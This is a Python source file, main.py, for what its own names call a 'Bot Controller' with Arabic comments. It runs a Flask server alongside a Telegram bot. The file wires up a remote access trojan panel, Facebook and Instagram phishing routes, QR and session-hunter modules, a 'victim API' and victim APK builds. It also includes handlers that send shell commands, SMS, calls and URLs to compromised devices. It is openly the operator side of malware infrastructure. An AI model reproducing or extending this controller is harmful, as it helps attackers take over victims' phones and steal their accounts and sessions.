# main.py
# ============================================================
# DEV 1 — Bot Controller v5 (مقسّم لملفات)
# ============================================================

import os
import time
import threading
import requests
from flask import Flask, request, jsonify

# ============================================================
# استيراد الملفات الداخلية
# ============================================================
from config import bot, redis_client, BOT_TOKEN, ORIGIN_SECRET
from imports_manager import (
    rat_bp, qr_bp, lsh_bp, sh_bp, LSH_ENABLED, SH_ENABLED,
    init_facebook_routes, init_instagram_routes, init_rat_routes,
    init_qr_routes, init_lsh_routes, init_session_hunter_routes,
    set_bot_reference, register_payment_handlers,
)
from utils import trigger_victim_apk_build, get_victim_apk_url
from api_victim import init_victim_api
from bot_handlers import (
    start_command, callback_handler,
    victim_name_step, v_toast_step, v_shell_step, v_sendsms_step,
    v_call_step, v_url_step, v_rename_step, victim_name_handler,
    admin_search_handler, admin_broadcast_handler,
    admin_ban_handler, admin_unban_handler, admin_delete_handler,
    admin_grant_vip_handler, admin_give_stars_handler,
    admin_msg_user_handler,
    _pending_open_url,
)
from short_link import init_short_link

# ============================================================
# إعداد Flask
# ============================================================
app = Flask(__name__)

# ============================================================
# Origin Gate
# ============================================================
ORIGIN_GATE_EXEMPT = ['/', '/health']


@app.before_request
def verify_origin():
    path = request.path
    if path in ORIGIN_GATE_EXEMPT:
        return None
    if request.method == 'OPTIONS':
        return None
    if path.startswith('/apk/') or path.startswith('/victim/'):
        return None
    secret = request.headers.get('X-Origin-Secret', '')
    if secret == ORIGIN_SECRET:
        return None
    client_ip = (request.headers.get('CF-Connecting-IP') or
                 request.headers.get('X-Forwarded-For') or
                 request.remote_addr)
    print(f"[-] BLOCKED: {path} from {client_ip}")
    return jsonify({"error": "Access denied"}), 403


@app.route('/')
def health_check():
    return "DEV 1 Controller is running.", 200


# ============================================================
# تسجيل Blueprints
# ============================================================
if rat_bp:
    app.register_blueprint(rat_bp)
if qr_bp:
    app.register_blueprint(qr_bp)
if LSH_ENABLED and lsh_bp:
    app.register_blueprint(lsh_bp)
if SH_ENABLED and sh_bp:
    app.register_blueprint(sh_bp)

# ============================================================
# Init Routes
# ============================================================
init_facebook_routes(app, bot)
init_instagram_routes(app, bot)
init_rat_routes(app, bot)
init_qr_routes(app, bot)
init_lsh_routes(app, bot)
init_session_hunter_routes(app, bot)

if LSH_ENABLED:
    set_bot_reference(bot)

register_payment_handlers(bot)

# ============================================================
# Victim API
# ============================================================
init_victim_api(app, bot)

# ============================================================
# Short Link
# ============================================================
init_short_link(app)


# ============================================================
# LSH — الرابط المُدخل
# ============================================================
from imports_manager import lsh_push_command


@bot.message_handler(func=lambda m: m.chat.id in _pending_open_url
                                    and m.text and m.text.startswith("http"))
def handle_open_url(message):
    sid = _pending_open_url.pop(message.chat.id, None)
    if sid:
        ok = lsh_push_command(sid, {"action": "url", "payload": {"url": message.text}})
        bot.send_message(message.chat.id, "✅ تم الإرسال" if ok else "❌ فشل")


# ============================================================
# تشغيل البوت
# ============================================================
def run_telegram_bot():
    print("[+] ============================================")
    print("[+] Starting Telegram Bot polling...")
    print(f"[+] Bot token: {BOT_TOKEN[:15]}...{BOT_TOKEN[-5:]}")
    print("[+] ============================================")

    try:
        r = requests.get(
            f"https://api.telegram.org/bot{BOT_TOKEN}/deleteWebhook",
            params={"drop_pending_updates": "true"},
            timeout=15,
        )
        print(f"[+] deleteWebhook HTTP {r.status_code}")
    except Exception as e:
        print(f"[-] deleteWebhook: {e}")

    try:
        r = requests.get(f"https://api.telegram.org/bot{BOT_TOKEN}/getMe", timeout=15)
        print(f"[+] getMe: {r.text[:200]}")
    except Exception as e:
        print(f"[-] getMe: {e}")

    print("[+] Starting infinity_polling loop...")
    attempt = 0
    while True:
        try:
            attempt += 1
            print(f"[+] Polling attempt #{attempt}")
            bot.infinity_polling(
                skip_pending=True,
                timeout=30,
                long_polling_timeout=30,
                none_stop=True,
            )
        except Exception as e:
            print(f"[-] Polling crashed: {e}")
            print("[+] Restarting in 5 seconds...")
            time.sleep(5)


if __name__ == "__main__":
    bot_thread = threading.Thread(target=run_telegram_bot, daemon=True)
    bot_thread.start()

    time.sleep(2)

    port = int(os.environ.get("PORT", 8080))
    print(f"[+] Flask Web Server starting on port {port}...")
    app.run(host="0.0.0.0", port=port, debug=False, use_reloader=False)
